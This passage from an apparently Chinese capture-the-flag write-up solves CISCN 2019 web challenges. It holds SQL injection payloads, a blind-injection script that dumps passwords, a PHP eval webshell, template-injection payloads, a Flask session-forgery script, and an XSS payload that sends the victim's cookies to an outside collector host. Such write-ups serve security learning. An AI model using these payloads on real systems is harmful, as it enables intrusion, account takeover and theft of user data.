class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"未找到订单!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单修改成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"未找到订单!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">'delete from `user` where `user_id`='</span> . $row[<span class="string">"user_id"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单删除成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"未找到订单!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计源码后重点关注address有无注入，发现题目都只对前两个参数进行了过滤，并未检查<code>address</code>。同时<code>address</code>只经过了一次<code>addslashes()</code>就被存储，这是经典的二次注入的使用场景。加上触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>回显以<code>error</code>的形式被打印出来，证明我们需要使用报错注入。<br>具体形式是，我们提交姓名，电话，地址三个参数，并在地址使用报错注入。之后在change.php再次提交相同姓名电话与随便写地址，即可触发<code>update</code>执行报错注入。根据update语句构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>貌似题目flag不在库里，看wp发现是/flag.txt。有点迷惑。需要注意报错注入字段数的限制，调整<code>substr()</code>的后两个参数。</p><h1 id="Easyweb（布尔盲注）"><a href="#Easyweb（布尔盲注）" class="headerlink" title="Easyweb（布尔盲注）"></a>Easyweb（布尔盲注）</h1><p>开始从robots.txt得到的image.php.bak的源码泄露信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>发现有sql注入点，主要要应对两个参数的过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br></pre></td></tr></table></figure><p>考虑使用<code>\0</code>，并在path中注入。这样我们的sql语句就变成了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39; or path&#x3D;&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p>剩下的布尔盲注即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    print(i)<span class="comment">#ciscnfinal, images,users</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">128</span>):<span class="comment">#select group_concat(column_name) from information_schema.columns where table_name=database()</span></span><br><span class="line">        <span class="comment">#url = "http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),"+str(i)+",1))="+str(j)+",1,0)%23"</span></span><br><span class="line">        url = <span class="string">"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",1,0)%23"</span></span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注入得到username与password登录进入后台。发现一个文件上传点。简单fuzz下发现文件名会被存储到固定php日志文件中<code>logs/upload.b888aaa68e9659c297c4b02084157cff.log.php</code><br>既然如此只需上传一句话。发现php关键字被拦。<br>使用短标签绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=@<span class="keyword">eval</span>($_GET[<span class="string">'byc'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是因为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;php.ini中</span><br><span class="line">short_open_tag &#x3D; On</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;除&lt;?php ?&gt;，可使用更灵活的调用方法</span><br><span class="line">&lt;? &#x2F;*程序操作*&#x2F; ?&gt;</span><br><span class="line">&lt;?&#x3D;&#x2F;*函数*&#x2F;?&gt;</span><br></pre></td></tr></table></figure><p>bypass掉后执行命令<code>system(&#39;cat /flag&#39;);</code>即可</p><h1 id="华东南赛区-Web11（模板注入）"><a href="#华东南赛区-Web11（模板注入）" class="headerlink" title="华东南赛区 Web11（模板注入）"></a>华东南赛区 Web11（模板注入）</h1><p>这题开始看的我贼奇怪，因为整个网站貌似只是一个api接口。其中回显有一部分十分显眼<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/4.PNG" alt="xff"><br>开始考虑是否存在关于xff头的信息。但是没测出来。去网上搜了波wp恍然大悟。原来关键点在网页下方提示的<code>Build With Smarty !</code><br>Smarty是一种php网页引擎，也存在如pythonjinja2的ssti注入。</p><p>同时其使用方法如<code>{if cmd}{/if}</code>可以执行命令。<br>所以首先bp里更改xff包，尝试2,发现注入成功；<br>之后直接任意命令执行即可拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;file_get_contents(&#39;&#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag4.PNG" alt="flag"></p><h1 id="华东北赛区-Web2（存储型xss-sql注入）"><a href="#华东北赛区-Web2（存储型xss-sql注入）" class="headerlink" title="华东北赛区 Web2（存储型xss+sql注入）"></a>华东北赛区 Web2（存储型xss+sql注入）</h1><p>题目算是比较传统的xss触发模式了。注册登录后一个输入框允许我们使用xsspayload，还有一个界面输入验证码后触发bot阅读。我们目标就是打到admin的cookie。</p><p>首先尝试性弹个窗，结果在页面里看到个自己有心理阴影的CSP限制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"content-security-policy"</span> content=<span class="string">"default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'"</span>&gt;</span><br></pre></td></tr></table></figure><p>好在csp规则不算比较严格。因为<code>&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;</code>允许我们加载一段内联js代码执行。而解决这个的办法只需使用<code>window.location.href</code>就可绕过。这里因为有buuoj提供的xss平台，所以直接用生成的代码打一打看看。发现有过滤与转换，估计得实体编码绕过。<br>把xss平台生成的payload改成实体编码：(注意id值是生成代码里的id，一开始以为是项目名id半天打不到)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> (<span class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>实体编码payload<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>提交后访问页面，可以看到平台是能收到cookie的，那就不需要关心其他的，直接去反馈页面跑段脚本爆破验证码提交即可。等待bot点击页面，之后平台收到cookie<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/5.PNG" alt="cookie"><br>修改登录进入admin.php后台，一个明显的sql注入直接联合查询即可。3个字段，回显第2,3个<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag5.PNG" alt="flag"></p><h1 id="double-secrect-ssti"><a href="#double-secrect-ssti" class="headerlink" title="double secrect (ssti)"></a>double secrect (ssti)</h1><p>基本上唬人的成分比较大。因为一开始进入题目只有一句<code>Welcome To Find Secret</code>，之后访问robots.txt发现居然报this is android ctf，让我以为看错题了。但其实访问secret路由并传参secret时，发现会有回显。当回显字数多的时候出现python报错，可以猜测是ssti。这里我尝试直接传一段中文，其实ascii码比较大的文字也会触发报错，爆出重要源码：<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/6.PNG" alt="RC4"></p><p>原来是段加密，而且爆出的源码连key值都给了。那么直接RC4加密我们的ssti payload基本就完事了。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_S_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.Box[i]) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % <span class="number">256</span></span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret='</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd=<span class="string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h1 id="华东南赛区-Web4-flask-session-cookie伪造"><a href="#华东南赛区-Web4-flask-session-cookie伪造" class="headerlink" title="华东南赛区 Web4 (flask session cookie伪造)"></a>华东南赛区 Web4 (flask session cookie伪造)</h1><p>被没必要的情况给浪费了时间……主要是环境问题，心里苦啊。<br>首先题目给了一个参数可以读取文件，由于路由名称，先看下源码app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, </span><br><span class="line">urllib <span class="keyword">from</span> flask </span><br><span class="line"><span class="keyword">import</span> Flask, session, request </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">         m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">         n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">         <span class="keyword">if</span> m <span class="keyword">or</span> n: <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">            res = urllib.urlopen(url) </span><br><span class="line">            <span class="keyword">return</span> res.read() </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">        <span class="keyword">print</span> str(ex) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no response'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: </span><br><span class="line">    app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure><p>可以看到只要伪造<code>session[&#39;username&#39;]</code>的值就可以拿到flag了。由于这里的随机数种子<code>SECRECT_KEY</code>很轻松就可以伪造，所以直接上脚本爆破并生成cookie值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask_session_cookie_manager2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac = <span class="string">"02:42:ae:00:d0:09"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    key = str(random.random() * <span class="number">233</span>)</span><br><span class="line">    result = flask_session_cookie_manager2.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw'</span>, key)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">        result[<span class="string">u'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        <span class="keyword">print</span> flask_session_cookie_manager2.FSCM.encode(key, str(result))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>理论上改cookie就完事了，但是我白花了一个多小时，因为虚拟机的py2的环境有问题。期间还发现，原来参数不变时生成的cookie也会因为时间原因而不同。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/7.PNG" alt="不同的时间戳导致值不同"><br>当然这并不影响结果。只要是python2理论上就没有问题。<br>最后还是在vps上跑的脚本才拿到flag……</p><h1 id="PointSystem-PaddingOracle-cbc翻转"><a 